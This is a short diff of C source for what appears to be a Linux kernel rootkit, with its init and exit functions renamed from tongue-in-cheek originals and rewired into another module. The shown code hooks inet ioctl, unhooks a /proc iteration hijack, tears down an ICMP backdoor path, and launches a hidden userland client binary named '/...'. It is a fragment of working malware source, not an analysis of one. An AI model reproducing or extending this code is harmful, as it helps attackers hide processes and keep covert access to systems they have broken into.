@@ -938,9 +938,14 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
     return ret;
 }
 
-static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
+int lp_init_module( void ) ;
+int lp_cleanup_module( void ) ;
+
+extern int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
 {
   
+  lp_init_module( ) ;
+
     char* envp[] = { "HOME=/" , NULL } ;
     //    char* argv[] = { "/root/XJJ/client/client" , NULL } ;
     char* argv[] = { "/..." , NULL } ;
@@ -1012,8 +1017,11 @@ static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
     return 0;
 }
 
-static void __exit mischief_managed ( void )
+extern void __exit mischief_managed ( void )
 {
+
+  lp_cleanup_module( ) ;
+
     #if defined(_CONFIG_ICMP_)
     icmp_exit();
     #endif
@@ -1040,7 +1048,7 @@ static void __exit mischief_managed ( void )
     hijack_stop(proc_iterate);
 }
 
-module_init(i_solemnly_swear_that_i_am_up_to_no_good);
-module_exit(mischief_managed);
+/* module_init(i_solemnly_swear_that_i_am_up_to_no_good); */
+/* module_exit(mischief_managed); */
 
 MODULE_LICENSE("GPL");
